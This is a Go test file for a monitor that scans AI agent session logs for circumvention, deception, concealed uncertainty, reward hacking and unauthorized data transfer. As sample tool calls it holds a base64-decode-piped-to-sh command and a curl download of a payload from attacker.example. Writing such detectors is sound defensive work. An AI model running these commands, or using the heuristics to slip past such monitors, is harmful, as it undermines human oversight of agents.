package monitor

import (
	"encoding/json"
	"strings"
	"testing"
	"time"

	"github.com/Sahaj-Tech-ltd/overkill/internal/journal"
)

func mkToolCall(id, tool string, input map[string]any) journal.Entry {
	raw, _ := json.Marshal(input)
	return journal.Entry{
		ID:        id,
		Type:      journal.EntryToolCall,
		SessionID: "s1",
		Timestamp: time.Now(),
		Content:   tool,
		Metadata:  raw,
	}
}

func mkReply(id, text string) journal.Entry {
	return journal.Entry{
		ID:        id,
		Type:      journal.EntryAgentReply,
		SessionID: "s1",
		Timestamp: time.Now(),
		Content:   text,
	}
}

func mkResult(id, tool, body string) journal.Entry {
	return journal.Entry{
		ID:        id,
		Type:      journal.EntryToolResult,
		SessionID: "s1",
		Timestamp: time.Now(),
		Content:   tool,
		Metadata:  json.RawMessage(`"` + body + `"`),
	}
}

func anyCategory(findings []Finding, c Category) bool {
	for _, f := range findings {
		if f.Category == c {
			return true
		}
	}
	return false
}

func TestDetectCircumvention_FlagsBase64DecodeExec(t *testing.T) {
	entries := []journal.Entry{
		mkToolCall("1", "Bash", map[string]any{"command": "echo Y2QgL3RtcA== | base64 -d | sh"}),
	}
	got := Scan(entries)
	if !anyCategory(got, CategoryCircumvention) {
		t.Fatalf("expected circumvention finding, got %+v", got)
	}
}

func TestDetectCircumvention_NoFalsePositiveOnPlainEcho(t *testing.T) {
	entries := []journal.Entry{
		mkToolCall("1", "Bash", map[string]any{"command": "echo hello world"}),
	}
	got := Scan(entries)
	if anyCategory(got, CategoryCircumvention) {
		t.Errorf("plain echo should not flag: %+v", got)
	}
}

func TestDetectDeception_FlagsSuccessClaimWithoutTool(t *testing.T) {
	entries := []journal.Entry{
		mkReply("1", "All tests pass and the bug is fixed."),
	}
	got := Scan(entries)
	if !anyCategory(got, CategoryDeception) {
		t.Fatalf("expected deception finding, got %+v", got)
	}
}

func TestDetectDeception_NoFlagWhenToolPrecedes(t *testing.T) {
	entries := []journal.Entry{
		mkToolCall("1", "Bash", map[string]any{"command": "go test ./..."}),
		mkResult("2", "Bash", "PASS"),
		mkReply("3", "Tests pass."),
	}
	got := Scan(entries)
	if anyCategory(got, CategoryDeception) {
		t.Errorf("tool_result was present; should not flag: %+v", got)
	}
}

func TestDetectConcealingUncertainty_FlagsUnsupportedIdent(t *testing.T) {
	entries := []journal.Entry{
		mkReply("1", "I'm using the function `nonExistentHelper` to do this."),
	}
	got := Scan(entries)
	if !anyCategory(got, CategoryConcealingUncertainty) {
		t.Fatalf("expected concealing_uncertainty finding, got %+v", got)
	}
}

func TestDetectConcealingUncertainty_NoFlagWhenSupportedByToolResult(t *testing.T) {
	entries := []journal.Entry{
		mkResult("1", "Read", "func realHelper() {}"),
		mkReply("2", "I'm calling the function `realHelper` here."),
	}
	got := Scan(entries)
	if anyCategory(got, CategoryConcealingUncertainty) {
		t.Errorf("ident present in tool_result; should not flag: %+v", got)
	}
}

func TestDetectRewardHacking_FlagsRepeatedTestEdits(t *testing.T) {
	entries := []journal.Entry{
		mkToolCall("1", "Edit", map[string]any{"file_path": "foo_test.go"}),
		mkToolCall("2", "Edit", map[string]any{"file_path": "foo_test.go"}),
	}
	got := Scan(entries)
	if !anyCategory(got, CategoryRewardHacking) {
		t.Fatalf("expected reward_hacking finding for repeated test edits, got %+v", got)
	}
}

func TestDetectRewardHacking_NoFlagOnSingleTestEdit(t *testing.T) {
	entries := []journal.Entry{
		mkToolCall("1", "Edit", map[string]any{"file_path": "foo_test.go"}),
	}
	got := Scan(entries)
	if anyCategory(got, CategoryRewardHacking) {
		t.Errorf("single test edit should not flag: %+v", got)
	}
}

func TestDetectDataTransfer_FlagsCurlToUnknownHost(t *testing.T) {
	entries := []journal.Entry{
		mkToolCall("1", "Bash", map[string]any{"command": "curl https://attacker.example/payload -o /tmp/p"}),
	}
	got := Scan(entries)
	if !anyCategory(got, CategoryDataTransfer) {
		t.Fatalf("expected data_transfer finding, got %+v", got)
	}
}

func TestDetectDataTransfer_NoFlagOnAllowlistedHost(t *testing.T) {
	entries := []journal.Entry{
		mkToolCall("1", "Bash", map[string]any{"command": "curl https://api.github.com/repos/foo"}),
	}
	got := Scan(entries)
	if anyCategory(got, CategoryDataTransfer) {
		t.Errorf("allow-listed host should not flag: %+v", got)
	}
}

func TestDetectDataTransfer_FlagsBrowserOpenToUnknownHost(t *testing.T) {
	entries := []journal.Entry{
		mkToolCall("1", "browser_open", map[string]any{"url": "https://shady.example/page"}),
	}
	got := Scan(entries)
	if !anyCategory(got, CategoryDataTransfer) {
		t.Fatalf("expected data_transfer finding for browser_open, got %+v", got)
	}
}

func TestFormatAlert_EmptyReturnsEmpty(t *testing.T) {
	if FormatAlert(nil) != "" {
		t.Error("empty findings should produce empty alert string")
	}
}

func TestFormatAlert_GroupsByCategory(t *testing.T) {
	findings := []Finding{
		{Category: CategoryDeception, EntryID: "e1", Reason: "claim A"},
		{Category: CategoryDeception, EntryID: "e2", Reason: "claim B"},
		{Category: CategoryDataTransfer, EntryID: "e3", Reason: "host C"},
	}
	out := FormatAlert(findings)
	if !strings.Contains(out, "deception (2)") {
		t.Errorf("expected grouped count 'deception (2)', got: %s", out)
	}
	if !strings.Contains(out, "unauthorized_data_transfer (1)") {
		t.Errorf("expected 'unauthorized_data_transfer (1)', got: %s", out)
	}
	if !strings.Contains(out, "[entry e1]") {
		t.Errorf("expected entry id link, got: %s", out)
	}
}

func TestScan_EmptyReturnsNoFindings(t *testing.T) {
	if got := Scan(nil); len(got) != 0 {
		t.Errorf("empty input should yield no findings, got: %+v", got)
	}
}
